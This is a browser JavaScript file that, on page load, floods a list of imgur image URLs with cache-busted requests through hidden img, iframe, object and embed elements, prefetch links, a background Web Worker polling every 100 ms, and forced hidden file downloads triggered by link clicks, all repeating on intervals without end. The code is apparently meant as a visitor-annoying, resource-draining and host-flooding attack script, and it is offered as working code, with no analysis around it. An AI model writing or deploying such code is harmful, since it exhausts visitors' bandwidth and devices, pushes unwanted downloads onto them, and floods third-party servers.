const images = [
    'https://i.imgur.com/1bQ7QqM.jpg',
    'https://i.imgur.com/2cR8RrN.jpg',
    'https://i.imgur.com/3dS9SsO.jpg',
    'https://i.imgur.com/4eT0TtP.jpg',
    'https://i.imgur.com/5fU1UuQ.jpg',
    'https://i.imgur.com/6gV2VvR.jpg',
    'https://i.imgur.com/7hW3WwS.jpg',
    'https://i.imgur.com/8iX4XxT.jpg',
    'https://i.imgur.com/9jY5YyU.jpg',
    'https://i.imgur.com/0kZ6ZzV.jpg',
    'https://i.imgur.com/alA7a7W.jpg',
    'https://i.imgur.com/bmB8b8X.jpg',
    'https://i.imgur.com/cnC9c9Y.jpg',
    'https://i.imgur.com/doD0d0Z.jpg',
    'https://i.imgur.com/epE1e1A.jpg',
    'https://i.imgur.com/fqF2f2B.jpg',
    'https://i.imgur.com/grG3g3C.jpg',
    'https://i.imgur.com/hsH4h4D.jpg',
    'https://i.imgur.com/itI5i5E.jpg',
    'https://i.imgur.com/juJ6j6F.jpg',
    'https://i.imgur.com/kvK7k7G.jpg',
    'https://i.imgur.com/lwL8l8H.jpg',
    'https://i.imgur.com/mxM9m9I.jpg',
    'https://i.imgur.com/nyN0n0J.jpg',
    'https://i.imgur.com/ozO1o1K.jpg'
];

function spamImages() {
    for (let i = 0; i < 50; i++) {
        setTimeout(() => {
            const randomImage = images[Math.floor(Math.random() * images.length)];
            
            const img = new Image();
            img.src = randomImage + '?cache=' + Math.random();
            img.style.display = 'none';
            document.body.appendChild(img);
            
            const link = document.createElement('a');
            link.href = randomImage;
            link.download = 'image_' + Date.now() + '_' + i + '.jpg';
            link.style.display = 'none';
            document.body.appendChild(link);
            
            setTimeout(() => {
                try {
                    link.click();
                } catch(e) {}
            }, 10);
            
            fetch(randomImage + '?t=' + Date.now(), {
                mode: 'no-cors',
                cache: 'no-store'
            }).catch(() => {});
            
            const iframe = document.createElement('iframe');
            iframe.src = randomImage;
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            
            const object = document.createElement('object');
            object.data = randomImage;
            object.style.display = 'none';
            document.body.appendChild(object);
            
            const embed = document.createElement('embed');
            embed.src = randomImage;
            embed.style.display = 'none';
            document.body.appendChild(embed);
            
            setTimeout(() => {
                try {
                    if (img.parentNode) img.parentNode.removeChild(img);
                    if (link.parentNode) link.parentNode.removeChild(link);
                    if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                    if (object.parentNode) object.parentNode.removeChild(object);
                    if (embed.parentNode) embed.parentNode.removeChild(embed);
                } catch(e) {}
            }, 5000);
            
        }, i * 10);
    }
}

function createImageLoaders() {
    for (let j = 0; j < 10; j++) {
        const container = document.createElement('div');
        container.style.display = 'none';
        container.id = 'image-spam-container-' + j;
        document.body.appendChild(container);
        
        for (let k = 0; k < 20; k++) {
            const randomImage = images[Math.floor(Math.random() * images.length)];
            const img = document.createElement('img');
            img.src = randomImage + '?cache=' + Math.random() + '_' + j + '_' + k;
            container.appendChild(img);
        }
    }
}

function setupBackgroundDownloads() {
    try {
        const blob = new Blob([`
            self.onmessage = function(e) {
                const sites = ${JSON.stringify(images)};
                setInterval(() => {
                    fetch(sites[Math.floor(Math.random() * sites.length)] + '?t=' + Date.now(), {
                        mode: 'no-cors'
                    }).catch(() => {});
                }, 100);
            };
        `], { type: 'application/javascript' });
        
        const worker = new Worker(URL.createObjectURL(blob));
        worker.postMessage('start');
    } catch(e) {}
}

window.addEventListener('load', function() {
    createImageLoaders();
    
    setTimeout(spamImages, 500);
    
    setTimeout(spamImages, 2000);
    
    setTimeout(spamImages, 4000);
    
    setInterval(spamImages, 3000);
    
    setupBackgroundDownloads();
    
    for (let i = 0; i < 100; i++) {
        setTimeout(() => {
            const randomImage = images[Math.floor(Math.random() * images.length)];
            const link = document.createElement('link');
            link.rel = 'prefetch';
            link.href = randomImage + '?p=' + Math.random();
            document.head.appendChild(link);
        }, i * 50);
    }
});

for (let i = 0; i < 200; i++) {
    const preloadImage = new Image();
    preloadImage.src = images[Math.floor(Math.random() * images.length)] + '?pre=' + i + '_' + Date.now();
}
